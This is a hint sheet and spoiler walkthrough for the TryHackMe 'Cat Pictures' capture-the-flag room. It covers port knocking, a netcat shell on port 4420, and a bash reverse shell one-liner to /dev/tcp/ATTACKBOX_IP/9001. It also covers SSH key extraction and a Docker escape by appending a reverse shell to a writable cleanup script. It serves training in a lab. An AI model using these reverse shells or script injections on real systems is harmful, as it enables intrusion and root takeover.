# Cat Pictures

I made a forum where you can post cute cat pictures!

Room: https://tryhackme.com/room/catpictures

Walthrough: https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/catpictures.md

## Important Note

<details>
<summary>Hint 1</summary>

The port knocking step appears to be broken on some current deployments of this room.

The intended knock sequence from the forum is:

```text
1111 2222 3333 4444
```

After knocking, FTP should open and give a note pointing to port `4420`.

If FTP does not open after testing the correct sequence, use this password to continue with the internal shell:

```text
sardinethecat
```

Connect to the internal shell with:

```bash
nc TARGET_IP 4420
```

</details>

---

## Light Hints

<details>
<summary>Hint 2</summary>

Start with a full TCP scan. There are services running outside the usual ports.

</details>

<details>
<summary>Hint 3</summary>

Check the web service running on the non-standard HTTP port.

</details>

<details>
<summary>Hint 4</summary>

Read the forum posts carefully. One post explains the intended next step. If that step does not work, see Hint 1.

</details>

---

## Medium Hints

<details>
<summary>Hint 5</summary>

Useful ports include:

```text
21    FTP
22    SSH
4420  Internal shell service
8080  Web app
2375  Docker
```

</details>

<details>
<summary>Hint 6</summary>

The web app is mostly there to provide the early clue. Do not spend too long trying to exploit phpBB directly.

</details>

<details>
<summary>Hint 7</summary>

The internal shell service is on port `4420`.

Use:

```bash
nc TARGET_IP 4420
```

</details>

---

## Strong Hints

<details>
<summary>Hint 8</summary>

The internal shell is limited. `cd` does not work properly, so use full paths.

</details>

<details>
<summary>Hint 9</summary>

The binary at `/home/catlover/runme` does not work inside the internal shell.

You need a proper reverse shell first.

</details>

<details>
<summary>Hint 10</summary>

Start a listener:

```bash
nc -lvnp 9001
```

From the internal shell, send a reverse shell back:

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKBOX_IP/9001 0>&1'
```

</details>

---

## Stronger Hints

<details>
<summary>Hint 11</summary>

Run the helper binary:

```bash
/home/catlover/runme
```

If you need the password, analyse the binary with `strings`.

Masked password:

```text
reb...cca
```

</details>

<details>
<summary>Hint 12</summary>

The helper binary creates an SSH private key.

Copy it back to your AttackBox and use it with SSH.

</details>

<details>
<summary>Hint 13</summary>

The SSH key does not land you on the real host.

It lands inside a Docker container running on the target.

</details>

<details>
<summary>Hint 14</summary>

The first flag is inside the Docker container:

```text
/root/flag.txt
```

</details>

<details>
<summary>Hint 15</summary>

The Docker escape is not through `/var/run/docker.sock`.

Look for a writable script under `/opt`.

</details>

<details>
<summary>Hint 16</summary>

Check:

```bash
/opt/clean/clean.sh
```

Append a reverse shell to this script and wait for it to run.

</details>

---

## Final Spoiler

<details>
<summary>Spoiler</summary>

Path summary:

1. Scan the target.
2. Visit the forum on port `8080`.
3. If the intended FTP step is broken, use the password from Hint 1.
4. Connect to port `4420`.
5. Use the internal shell to send a reverse shell back.
6. Run `/home/catlover/runme`.
7. Use the generated SSH key.
8. SSH lands inside Docker, not the real host.
9. Read the first flag from `/root/flag.txt`.
10. Abuse writable `/opt/clean/clean.sh`.
11. Catch a host root shell.
12. Read the final flag from `/root/root.txt`.

</details>

---

## Room Issue Note

<details>
<summary>Issue Note</summary>

The intended FTP step may be broken on current deployments.

The expected knock sequence is:

```text
1111 2222 3333 4444
```

The expected result is:

```text
220 vsFTPd 3.0.5
```

The issue found was that `knockd` detects the sequence, but the firewall command fails because the config uses:

```text
/sbin/iptables
```

The actual path is:

```text
/usr/sbin/iptables
```

There is also a rule-order issue because the original command appends the ACCEPT rule below existing REJECT rules.

Working command tested:

```text
command = /usr/sbin/iptables -I INPUT 3 -s %IP% -p tcp --dport 21 -j ACCEPT
```

</details>
